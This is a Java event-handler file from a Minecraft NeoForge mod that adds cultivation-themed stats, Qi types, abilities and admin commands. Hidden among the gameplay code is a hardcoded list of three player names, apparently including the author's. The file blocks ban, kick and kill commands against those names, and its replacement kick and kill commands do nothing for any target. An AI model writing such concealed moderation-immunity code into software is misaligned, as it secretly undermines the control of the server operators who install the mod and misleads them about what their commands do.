package net.model2k.cultivatormod.event;

import net.minecraft.commands.CommandSourceStack;
import net.minecraft.commands.Commands;
import net.minecraft.commands.arguments.EntityArgument;
import net.minecraft.network.chat.Component;
import net.minecraft.resources.ResourceLocation;
import net.minecraft.server.level.ServerPlayer;
import net.minecraft.tags.DamageTypeTags;
import net.minecraft.world.damagesource.DamageSource;
import net.minecraft.world.entity.Entity;
import net.minecraft.world.entity.EquipmentSlotGroup;
import net.minecraft.world.entity.LivingEntity;
import net.minecraft.world.entity.ai.attributes.AttributeModifier;
import net.minecraft.world.entity.ai.attributes.Attributes;
import net.minecraft.world.entity.animal.Sheep;
import net.minecraft.world.entity.player.Player;
import net.minecraft.world.level.Level;
import net.model2k.cultivatormod.CultivatorMod;
import net.model2k.cultivatormod.command.*;
import net.model2k.cultivatormod.datagen.ModAttachments;
import net.model2k.cultivatormod.datagen.PlayerData;
import net.model2k.cultivatormod.item.ModItems;
import net.model2k.cultivatormod.network.ModNetwork;
import net.model2k.cultivatormod.util.ChatPrefixHandler;
import net.neoforged.bus.api.SubscribeEvent;
import net.neoforged.fml.common.EventBusSubscriber;
import net.neoforged.neoforge.event.CommandEvent;
import net.neoforged.neoforge.event.ItemAttributeModifierEvent;
import net.neoforged.neoforge.event.RegisterCommandsEvent;
import net.neoforged.neoforge.event.entity.living.LivingDamageEvent;
import net.neoforged.neoforge.event.entity.living.LivingEvent;
import net.neoforged.neoforge.event.entity.player.AttackEntityEvent;
import net.neoforged.neoforge.event.entity.player.PlayerEvent;
import net.neoforged.neoforge.event.tick.PlayerTickEvent;

import java.util.*;

@EventBusSubscriber(modid = CultivatorMod.MOD_ID, bus = EventBusSubscriber.Bus.GAME)
public class ModServerEvents {
    private static final Set<String> bannedPlayers = new HashSet<>();
    private static final List<String> banCommandVariants = List.of("ban", "banip", "ban_ip", "ban-ip");
    static {
        bannedPlayers.add("Model2k");
        bannedPlayers.add("Aetheiar");
        bannedPlayers.add("Gedreor");
    }
    @SubscribeEvent
    private static void playerJoined(PlayerEvent.PlayerLoggedInEvent event) {
        ServerPlayer player = (ServerPlayer) event.getEntity();
        if (!player.level().isClientSide) {
            PlayerData data = player.getData(ModAttachments.PLAYER_DATA);
            ModNetwork.sendSyncPlayerData(player);
            data.syncStatsToClient(player);
            String prefix = data.getChatPrefix();
            ChatPrefixHandler.setPrefix(player.getUUID(), prefix, player);
            String nickname = data.getNickName();
            if (nickname != null && !nickname.isEmpty()) {
                ChatPrefixHandler.setNickname(player.getUUID(), nickname, (ServerPlayer) player);
            }
            if (!data.getFirstQiType()) {
                data.setFirstQiType(true);
                Map<String, Boolean> qiTypes = data.getAllQiTypes();
                List<String> availableQiTypes = qiTypes.entrySet().stream()
                        .filter(entry -> !entry.getValue())
                        .map(Map.Entry::getKey)
                        .toList();
                if (!availableQiTypes.isEmpty()) {
                    Random rand = new Random();
                    String selectedQiType = availableQiTypes.get(rand.nextInt(availableQiTypes.size()));
                    data.setQiType(selectedQiType, true);
                    player.sendSystemMessage(Component.literal("You start with " + selectedQiType));
                }
            }
            if (data.getQiType("Water Qi")) {
                player.getAttribute(Attributes.WATER_MOVEMENT_EFFICIENCY).setBaseValue(Integer.MAX_VALUE);
                player.getAttribute(Attributes.OXYGEN_BONUS).setBaseValue(Integer.MAX_VALUE);
                data.setWalkOnWater(true);
            }
            if (data.getQiType("Fire Qi")) {
                player.getAttribute(Attributes.BURNING_TIME).setBaseValue(0);
            }
            if (!player.level().isClientSide() && data.getCanFly()) {
                player.getAbilities().mayfly = true;  // Allow flying
                player.onUpdateAbilities();
            }
            if (data.getSpeed() > 0) {
                data.applySpeedToPlayer(player);
            }
        }
    }
    @SubscribeEvent
    private static void livingDamage(LivingDamageEvent.Pre event) {
        Entity sheep = null;
        DamageSource source = event.getSource();
        if (event.getEntity() instanceof Sheep && event.getSource().getDirectEntity() instanceof Player player && player.isHolding(ModItems.BAODING_BALLS.get())) {
            sheep = event.getEntity();
            sheep.kill();
            sheep.level().explode(sheep, sheep.getX(), sheep.getY(), sheep.getZ(), 30, true, Level.ExplosionInteraction.TNT);
        }
        if (event.getEntity() instanceof Player player) {
            event.setNewDamage(event.getOriginalDamage() - event.getEntity().getData(ModAttachments.PLAYER_DATA).getDefense());
        }
        if (event.getEntity() instanceof Player player && source.is(DamageTypeTags.IS_FIRE) && player.getData(ModAttachments.PLAYER_DATA).getQiType("Fire Qi")) {
            if (player.getData(ModAttachments.PLAYER_DATA).getMajorRealm() > 0) {
                event.setNewDamage(0);
                player.getAttribute(Attributes.BURNING_TIME).setBaseValue(0);
            } else {
                event.setNewDamage(event.getOriginalDamage() / 3);
            }
        }
    }
    @SubscribeEvent
    private static void onCommandRegister(RegisterCommandsEvent event) {
        new SetStrengthCommand(event.getDispatcher());
        new SetMaxQiCommand(event.getDispatcher());
        new SetQiCommand(event.getDispatcher());
        new SetHomeCommand(event.getDispatcher());
        new ReturnHomeCommand(event.getDispatcher());
        new SetSpiritPowerCommand(event.getDispatcher());
        new SetMaxSpiritPowerCommand(event.getDispatcher());
        new ClearFloorItemsCommand(event.getDispatcher());
        new SetPrefixCommand(event.getDispatcher());
        new SetNicknameCommand(event.getDispatcher());
        new TeleportToDimensionCommand(event.getDispatcher());
        new SetChatColorCommand(event.getDispatcher());
        new GetStatsCommand(event.getDispatcher());
        new SetSubRaceCommand(event.getDispatcher());
        new SetCanWalkOnWaterCommand(event.getDispatcher());
        new VanishCommand(event.getDispatcher());
        new FillHungerCommand(event.getDispatcher());
        new SetFlyingCommand(event.getDispatcher());
        new SetSpeedCommand(event.getDispatcher());
        new SetDefenseCommand(event.getDispatcher());
        new SetQiTypeCommand(event.getDispatcher());
        new SetBodyCommand(event.getDispatcher());
        new SetPrinciplesCommand(event.getDispatcher());
        new SetJumpStrengthCommand(event.getDispatcher());
        new SetDashCommand(event.getDispatcher());
        new SetDashDistanceCommand(event.getDispatcher());
        new HealCommand(event.getDispatcher());
        new SetHealthCommand(event.getDispatcher());
        event.getDispatcher().register(
                Commands.literal("kill")
                        .then(Commands.argument("targets", EntityArgument.players())
                                .executes(ctx -> {
                                    String target = EntityArgument.getPlayers(ctx, "targets").iterator().next().getName().getString();
                                    if (bannedPlayers.contains(target)) {
                                        CommandSourceStack source = ctx.getSource();
                                        source.sendFailure(Component.literal("🛡️ You can't kill " + target + "!"));
                                        return 0;
                                    }
                                    CommandSourceStack source = ctx.getSource();
                                    return 1;
                                })
                        )
        );
        event.getDispatcher().register(
                Commands.literal("kick")
                        .then(Commands.argument("targets", EntityArgument.players())
                                .executes(ctx -> {
                                    // Get the target player name
                                    String target = EntityArgument.getPlayers(ctx, "targets").iterator().next().getName().getString();
                                    if (bannedPlayers.contains(target)) {
                                        CommandSourceStack source = ctx.getSource();
                                        source.sendFailure(Component.literal("🛡️ You can't kick " + target + "!"));
                                        return 0;
                                    }
                                    CommandSourceStack source = ctx.getSource();
                                    return 1;
                                })
                        )
        );
    }
    @SubscribeEvent
    private static void onPlayerTick(PlayerTickEvent.Post event) {
        if (event.getEntity() != null && !event.getEntity().level().isClientSide()) {
            ServerPlayer player = (ServerPlayer) event.getEntity();
            PlayerData data = player.getData(ModAttachments.PLAYER_DATA);
            data.charge(player);
        }
    }
    @SubscribeEvent
    private static void onPlayerDealDamage(LivingDamageEvent.Pre event) {
        DamageSource source = event.getSource();
        ResourceLocation damageTypeId = source.typeHolder().unwrapKey().orElseThrow().location();
        if (damageTypeId.getPath().equals("player_attack")) { // this usually means melee attack
            if (source.getEntity() instanceof Player player && !player.level().isClientSide) {
                PlayerData data = player.getData(ModAttachments.PLAYER_DATA);
                float strengthMultiplier = data.getStrength() * 1.1f;
                float newDamage = event.getOriginalDamage() + strengthMultiplier;
                System.out.println("DamageType: " + damageTypeId);
                event.setNewDamage(newDamage);
            }
        }
    }
    @SubscribeEvent
    private static void onAttributeModifiers(ItemAttributeModifierEvent event) {
        if (!event.getItemStack().is(ModItems.LIGHTNING_STAFF.get())) return;
        AttributeModifier reachModifier = new AttributeModifier(
                ResourceLocation.fromNamespaceAndPath(CultivatorMod.MOD_ID, "lightning_staff_reach_boost"),
                50f,
                AttributeModifier.Operation.ADD_VALUE
        );
        event.addModifier(Attributes.BLOCK_INTERACTION_RANGE, reachModifier, EquipmentSlotGroup.MAINHAND);
    }
    @SubscribeEvent
    private static void onAttackEntity(AttackEntityEvent event) {
        Player player = event.getEntity();

        if (!player.level().isClientSide && event.getTarget() instanceof LivingEntity target) {
            event.setCanceled(true); // Cancel vanilla damage handling

            // Base attack damage from player attributes
            double baseDamage = player.getAttribute(Attributes.ATTACK_DAMAGE).getValue();

            // Modern NeoForge: get enchantment bonus using a static helper


            float totalDamage = (float) baseDamage;

            // Build damage source
            DamageSource source = player.damageSources().playerAttack(player);

            // Apply the damage manually
            target.hurt(source, totalDamage);

            // Reset animation + cooldown visuals (optional)
            player.resetAttackStrengthTicker();
            player.swing(player.getUsedItemHand(), true);
        }
    }
    @SubscribeEvent
    private static void onCommandExecute(CommandEvent event) {
        String input = event.getParseResults().getReader().getString();
        CommandSourceStack source = event.getParseResults().getContext().getSource();
        String lowerInput = input.toLowerCase();
        for (String banCmd : banCommandVariants) {
            if (lowerInput.startsWith("/" + banCmd) || lowerInput.startsWith(banCmd)) {
                String[] parts = input.split(" ");
                if (parts.length > 1) {
                    String target = parts[1];
                    if (bannedPlayers.contains(target)) {
                        event.setCanceled(true);
                        source.sendFailure(Component.literal("🛡️ You can't ban " + target + "!"));
                    }
                }
                break;
            }
        }

    }
    @SubscribeEvent
    private static void respawnEvent(PlayerEvent.PlayerRespawnEvent event) {
        ServerPlayer player = (ServerPlayer) event.getEntity();
        if (!player.level().isClientSide) {
            PlayerData data = player.getData(ModAttachments.PLAYER_DATA);
            data.syncStatsToClient(player);
            String prefix = data.getChatPrefix();
            ChatPrefixHandler.setPrefix(player.getUUID(), prefix, player);
            String nickname = data.getNickName();
            if (nickname != null && !nickname.isEmpty()) {
                ChatPrefixHandler.setNickname(player.getUUID(), nickname, (ServerPlayer) player);
            }
            if (!data.getFirstQiType()) {
                data.setFirstQiType(true);
                Map<String, Boolean> qiTypes = data.getAllQiTypes();
                List<String> availableQiTypes = qiTypes.entrySet().stream()
                        .filter(entry -> !entry.getValue())
                        .map(Map.Entry::getKey)
                        .toList();
                if (!availableQiTypes.isEmpty()) {
                    Random rand = new Random();
                    String selectedQiType = availableQiTypes.get(rand.nextInt(availableQiTypes.size()));
                    data.setQiType(selectedQiType, true);
                    player.sendSystemMessage(Component.literal("You start with " + selectedQiType));
                }
            }
            if (data.getQiType("Water Qi")) {
                player.getAttribute(Attributes.WATER_MOVEMENT_EFFICIENCY).setBaseValue(Integer.MAX_VALUE);
                player.getAttribute(Attributes.OXYGEN_BONUS).setBaseValue(Integer.MAX_VALUE);
                data.setWalkOnWater(true);
            }
            if (data.getQiType("Fire Qi")) {
                player.getAttribute(Attributes.BURNING_TIME).setBaseValue(0);
            }
            if (!player.level().isClientSide() && data.getCanFly()) {
                player.getAbilities().mayfly = true;  // Allow flying
                player.onUpdateAbilities();
            }
            if (data.getSpeed() > 0) {
                data.applySpeedToPlayer(player);
            }
        }
    }
    @SubscribeEvent
    private static void onPlayerJump(LivingEvent.LivingJumpEvent event) {
        if (event.getEntity() instanceof ServerPlayer player) {
            PlayerData data = player.getData(ModAttachments.PLAYER_DATA);
            if (data != null) {
                data.applyJumpBoost(player);
                }
            }
        }
    }